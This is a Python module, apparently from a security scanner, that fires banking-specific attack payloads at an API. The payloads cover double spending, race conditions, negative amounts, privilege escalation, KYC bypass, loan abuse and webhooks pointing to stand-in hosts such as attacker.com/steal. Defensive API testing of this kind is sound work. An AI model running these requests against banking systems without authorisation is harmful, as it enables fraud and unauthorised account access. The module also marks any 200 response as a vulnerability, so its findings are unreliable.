#!/usr/bin/env python3
"""
Banking-Specific Security Checks for CyberSec Bot
Enhanced security checks for digital banking APIs
"""

import json
import time
import threading
from typing import Dict, List, Any

# Banking-specific attack payloads
BANKING_PAYLOADS = {
    'double_spending': [
        '{"amount": 1000, "to_account": "1234567890", "idempotency_key": "duplicate_key_123"}',
        '{"amount": 1000, "to_account": "1234567890", "transaction_id": "replay_attack_456"}',
        '{"amount": 1000, "to_account": "1234567890", "timestamp": "2023-01-01T00:00:00Z"}'
    ],
    'race_conditions': [
        '{"amount": 999999, "account_id": "race_condition_test"}',
        '{"loan_amount": 1000000, "user_id": "concurrent_loan"}',
        '{"withdrawal_amount": 50000, "account_id": "overdraft_test"}'
    ],
    'transaction_manipulation': [
        '{"amount": -1000, "to_account": "1234567890"}',
        '{"amount": 0.01, "to_account": "1234567890"}',
        '{"amount": "999999999999", "to_account": "1234567890"}',
        '{"amount": null, "to_account": "1234567890"}',
        '{"amount": "NaN", "to_account": "1234567890"}'
    ],
    'privilege_escalation': [
        '{"user_id": "admin", "role": "super_admin"}',
        '{"user_id": "123", "role": "admin"}',
        '{"user_id": "456", "permissions": ["read", "write", "delete", "admin"]}'
    ],
    'bola_attacks': [
        '{"user_id": "123", "account_id": "456"}',
        '{"user_id": "789", "account_id": "123"}',
        '{"user_id": "admin", "account_id": "victim_account"}'
    ],
    'session_fixation': [
        '{"session_token": "stale_token_123", "user_id": "456"}',
        '{"jwt_token": "expired_jwt_456", "user_id": "789"}',
        '{"auth_token": "leaked_token_789", "user_id": "123"}'
    ],
    'kyc_bypass': [
        '{"kyc_status": "completed", "documents": "skipped"}',
        '{"kyc_level": "full", "verification": "bypassed"}',
        '{"identity_verified": true, "documents": "forged"}'
    ],
    'loan_abuse': [
        '{"loan_amount": 1000000, "income": 1000}',
        '{"loan_amount": 500000, "credit_score": 300}',
        '{"loan_amount": 750000, "employment": "fake"}'
    ],
    'discount_abuse': [
        '{"promo_code": "FIRST50", "user_id": "new_user_123"}',
        '{"cashback_code": "WELCOME100", "user_id": "multiple_accounts"}',
        '{"discount_code": "SAVE20", "user_id": "replay_attack"}'
    ],
    'webhook_abuse': [
        '{"webhook_url": "https://attacker.com/steal", "event": "payment_success"}',
        '{"callback_url": "http://malicious.com/capture", "event": "kyc_complete"}',
        '{"redirect_url": "https://phishing.com/fake", "event": "login_success"}'
    ],
    'open_redirects': [
        '{"redirect_url": "https://attacker.com/steal"}',
        '{"callback_url": "http://malicious.com/capture"}',
        '{"return_url": "https://phishing.com/fake"}'
    ],
    'micro_transactions': [
        '{"amount": 0.01, "frequency": "1000_per_second"}',
        '{"amount": 0.001, "frequency": "unlimited"}',
        '{"amount": 0.0001, "frequency": "burst"}'
    ],
    'idempotency_check': [
        '{"idempotency_key": "duplicate_key_123", "amount": 1000}',
        '{"transaction_id": "replay_attack_456", "amount": 1000}',
        '{"request_id": "same_request_789", "amount": 1000}'
    ]
}

def test_double_spending(url: str, headers: Dict, req_func) -> List[str]:
    """Test for double spending vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['double_spending']:
        try:
            # Send the same request multiple times
            responses = []
            for i in range(3):
                resp = req_func(url, headers=headers, data=payload, timeout=5)
                responses.append(resp)
                time.sleep(0.1)  # Small delay between requests
            
            # Check if all responses are successful (potential double spending)
            if all(r.status_code == 200 for r in responses):
                vulnerabilities.append(f"DOUBLE_SPENDING: {payload} | All requests succeeded")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_race_conditions(url: str, headers: Dict, req_func) -> List[str]:
    """Test for race condition vulnerabilities"""
    vulnerabilities = []
    
    def concurrent_request(payload):
        try:
            return req_func(url, headers=headers, data=payload, timeout=5)
        except:
            return None
    
    for payload in BANKING_PAYLOADS['race_conditions']:
        try:
            # Send concurrent requests
            threads = []
            responses = []
            
            for i in range(5):  # 5 concurrent requests
                thread = threading.Thread(target=lambda: responses.append(concurrent_request(payload)))
                threads.append(thread)
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            # Check for race condition indicators
            successful_responses = [r for r in responses if r and r.status_code == 200]
            if len(successful_responses) > 1:
                vulnerabilities.append(f"RACE_CONDITION: {payload} | {len(successful_responses)} concurrent requests succeeded")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_transaction_manipulation(url: str, headers: Dict, req_func) -> List[str]:
    """Test for transaction amount manipulation"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['transaction_manipulation']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for successful manipulation
            if resp.status_code == 200:
                vulnerabilities.append(f"TRANSACTION_MANIPULATION: {payload} | Request succeeded with invalid amount")
            elif resp.status_code == 500:
                vulnerabilities.append(f"TRANSACTION_MANIPULATION: {payload} | Server error indicates potential vulnerability")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_privilege_escalation(url: str, headers: Dict, req_func) -> List[str]:
    """Test for privilege escalation vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['privilege_escalation']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for successful privilege escalation
            if resp.status_code == 200:
                vulnerabilities.append(f"PRIVILEGE_ESCALATION: {payload} | Admin access granted")
            elif resp.status_code == 403:
                # Check if response contains admin-related content
                if any(admin_term in resp.text.lower() for admin_term in ['admin', 'super', 'privilege']):
                    vulnerabilities.append(f"PRIVILEGE_ESCALATION: {payload} | Admin content in response")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_bola_attacks(url: str, headers: Dict, req_func) -> List[str]:
    """Test for Broken Object Level Authorization (BOLA)"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['bola_attacks']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for unauthorized access to other users' data
            if resp.status_code == 200:
                # Look for sensitive data in response
                sensitive_indicators = ['account', 'balance', 'transaction', 'personal', 'ssn', 'pan', 'aadhaar']
                if any(indicator in resp.text.lower() for indicator in sensitive_indicators):
                    vulnerabilities.append(f"BOLA_ATTACK: {payload} | Unauthorized access to sensitive data")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_session_fixation(url: str, headers: Dict, req_func) -> List[str]:
    """Test for session fixation and token misuse"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['session_fixation']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for session/token vulnerabilities
            if resp.status_code == 200:
                vulnerabilities.append(f"SESSION_FIXATION: {payload} | Stale token accepted")
            elif resp.status_code == 401:
                # Check if response reveals token information
                if any(token_term in resp.text.lower() for token_term in ['token', 'session', 'jwt', 'auth']):
                    vulnerabilities.append(f"SESSION_FIXATION: {payload} | Token information leaked")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_kyc_bypass(url: str, headers: Dict, req_func) -> List[str]:
    """Test for KYC bypass vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['kyc_bypass']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for KYC bypass
            if resp.status_code == 200:
                vulnerabilities.append(f"KYC_BYPASS: {payload} | KYC verification bypassed")
            elif resp.status_code == 500:
                vulnerabilities.append(f"KYC_BYPASS: {payload} | Server error in KYC processing")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_loan_abuse(url: str, headers: Dict, req_func) -> List[str]:
    """Test for loan abuse vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['loan_abuse']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for loan abuse
            if resp.status_code == 200:
                vulnerabilities.append(f"LOAN_ABUSE: {payload} | Loan approved with invalid criteria")
            elif resp.status_code == 500:
                vulnerabilities.append(f"LOAN_ABUSE: {payload} | Server error in loan processing")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_discount_abuse(url: str, headers: Dict, req_func) -> List[str]:
    """Test for discount and cashback abuse"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['discount_abuse']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for discount abuse
            if resp.status_code == 200:
                vulnerabilities.append(f"DISCOUNT_ABUSE: {payload} | Discount applied multiple times")
            elif resp.status_code == 500:
                vulnerabilities.append(f"DISCOUNT_ABUSE: {payload} | Server error in discount processing")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_webhook_abuse(url: str, headers: Dict, req_func) -> List[str]:
    """Test for webhook abuse and SSRF"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['webhook_abuse']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for webhook abuse
            if resp.status_code == 200:
                vulnerabilities.append(f"WEBHOOK_ABUSE: {payload} | Malicious webhook accepted")
            elif resp.status_code == 500:
                vulnerabilities.append(f"WEBHOOK_ABUSE: {payload} | Server error in webhook processing")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_open_redirects(url: str, headers: Dict, req_func) -> List[str]:
    """Test for open redirect vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['open_redirects']:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for open redirects
            if resp.status_code in [200, 302, 301]:
                # Check if response contains redirect to malicious URL
                if any(malicious_url in resp.text.lower() for malicious_url in ['attacker.com', 'malicious.com', 'phishing.com']):
                    vulnerabilities.append(f"OPEN_REDIRECT: {payload} | Redirect to malicious URL")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_micro_transactions(url: str, headers: Dict, req_func) -> List[str]:
    """Test for micro-transaction abuse"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['micro_transactions']:
        try:
            # Send multiple rapid requests
            responses = []
            for i in range(10):
                resp = req_func(url, headers=headers, data=payload, timeout=2)
                responses.append(resp)
                time.sleep(0.01)  # Very small delay
            
            # Check if all requests succeeded (potential abuse)
            successful = [r for r in responses if r.status_code == 200]
            if len(successful) >= 8:  # 80% success rate
                vulnerabilities.append(f"MICRO_TRANSACTION_ABUSE: {payload} | {len(successful)}/10 rapid requests succeeded")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_idempotency_check(url: str, headers: Dict, req_func) -> List[str]:
    """Test for idempotency key vulnerabilities"""
    vulnerabilities = []
    
    for payload in BANKING_PAYLOADS['idempotency_check']:
        try:
            # Send the same request multiple times
            responses = []
            for i in range(3):
                resp = req_func(url, headers=headers, data=payload, timeout=5)
                responses.append(resp)
                time.sleep(0.1)
            
            # Check if all requests succeeded (lack of idempotency)
            if all(r.status_code == 200 for r in responses):
                vulnerabilities.append(f"IDEMPOTENCY_FAILURE: {payload} | Duplicate requests all succeeded")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_verbose_errors(url: str, headers: Dict, req_func) -> List[str]:
    """Test for verbose error messages"""
    vulnerabilities = []
    
    # Test with invalid payloads to trigger errors
    error_payloads = [
        '{"invalid": "payload"}',
        '{"amount": "invalid"}',
        '{"user_id": null}',
        '{"data": "malformed"}'
    ]
    
    for payload in error_payloads:
        try:
            resp = req_func(url, headers=headers, data=payload, timeout=5)
            
            # Check for verbose error messages
            if resp.status_code in [400, 500]:
                verbose_indicators = [
                    'stack trace', 'exception', 'error in', 'sql', 'database',
                    'table', 'column', 'syntax', 'mysql', 'postgresql', 'oracle',
                    'file path', 'directory', 'internal', 'debug', 'traceback'
                ]
                
                if any(indicator in resp.text.lower() for indicator in verbose_indicators):
                    vulnerabilities.append(f"VERBOSE_ERROR: {payload} | Detailed error information exposed")
            
        except Exception as e:
            continue
    
    return vulnerabilities

def test_metadata_leakage(url: str, headers: Dict, req_func) -> List[str]:
    """Test for metadata leakage in responses"""
    vulnerabilities = []
    
    try:
        resp = req_func(url, headers=headers, timeout=5)
        
        # Check for metadata leakage
        metadata_indicators = [
            'internal', 'debug', 'test', 'dev', 'staging', 'localhost',
            '192.168.', '10.0.', '172.16.', '127.0.0.1',
            'timestamp', 'created_at', 'updated_at', 'id', 'uuid',
            'email', 'phone', 'address', 'ssn', 'pan', 'aadhaar'
        ]
        
        if any(indicator in resp.text.lower() for indicator in metadata_indicators):
            vulnerabilities.append(f"METADATA_LEAKAGE: Sensitive metadata exposed in response")
        
        # Check headers for metadata
        sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-runtime']
        for header in sensitive_headers:
            if header in resp.headers:
                vulnerabilities.append(f"METADATA_LEAKAGE: {header} header exposed")
        
    except Exception as e:
        pass
    
    return vulnerabilities

# Main function to run all banking security checks
def run_banking_security_checks(url: str, headers: Dict, req_func) -> Dict[str, List[str]]:
    """Run all banking-specific security checks"""
    
    results = {
        'double_spending': test_double_spending(url, headers, req_func),
        'race_conditions': test_race_conditions(url, headers, req_func),
        'transaction_manipulation': test_transaction_manipulation(url, headers, req_func),
        'privilege_escalation': test_privilege_escalation(url, headers, req_func),
        'bola_attacks': test_bola_attacks(url, headers, req_func),
        'session_fixation': test_session_fixation(url, headers, req_func),
        'kyc_bypass': test_kyc_bypass(url, headers, req_func),
        'loan_abuse': test_loan_abuse(url, headers, req_func),
        'discount_abuse': test_discount_abuse(url, headers, req_func),
        'webhook_abuse': test_webhook_abuse(url, headers, req_func),
        'open_redirects': test_open_redirects(url, headers, req_func),
        'micro_transactions': test_micro_transactions(url, headers, req_func),
        'idempotency_check': test_idempotency_check(url, headers, req_func),
        'verbose_errors': test_verbose_errors(url, headers, req_func),
        'metadata_leakage': test_metadata_leakage(url, headers, req_func)
    }
    
    return results 